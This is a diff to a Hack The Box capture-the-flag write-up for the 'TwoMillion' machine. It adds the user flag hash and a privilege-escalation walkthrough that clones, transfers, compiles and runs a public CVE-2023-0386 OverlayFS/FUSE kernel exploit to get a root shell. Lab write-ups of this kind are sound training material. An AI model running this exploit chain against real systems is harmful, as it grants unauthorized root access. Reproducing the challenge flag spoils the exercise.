@@ -5,6 +5,7 @@ difficulty: easy
 os: linux
 releaseDate: 2023-06-07
 slug: "two-million"
+isPublished: false
 ---
 
 ## Enumeration
@@ -280,6 +281,73 @@ memcache:x:115:121:Memcached,,,:/nonexistent:/bin/false
 ssh admin@2million.htb
 ```
 
+```bash
+admin@2million:~$ cat user.txt 
+
+5eb46ff7e6bb1c5e71ac52aeaefeb814
+```
+
 ## Privilege Escalation
+
+```bash
+admin@2million:~$ cat /var/mail/admin 
+From: ch4p <ch4p@2million.htb>
+To: admin <admin@2million.htb>
+Cc: g0blin <g0blin@2million.htb>
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: <9876543210@2million.htb>
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+
+HTB Godfather
+```
+
+```bash
+uname -a
+Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+```bash
+admin@2million:~$ lsb_release -a
+No LSB modules are available.
+Distributor ID:	Ubuntu
+Description:	Ubuntu 22.04.2 LTS
+Release:	22.04
+Codename:	jammy
+```
+
+```bash
+git clone https://github.com/xkaneiki/CVE-2023-0386.git
+zip -r cve.zip CVE-2023-0386
+scp cve.zip admin@2million.htb:/tmp
+```
+
+```bash
+cd /tmp
+unzip cve.zip
+cd /tmp/CVE-2023-0386/
+make all
+```
+
+```bash
+./fuse ./ovlcap/lower ./gc &
+[+] len of gc: 0x3ee0
+[1] 6153
+```
+
+```bash
+./exp
+```
+
+```bash
+root@2million:~$ cat root.txt 
+
+************************
+```
+
 
 ## Extra
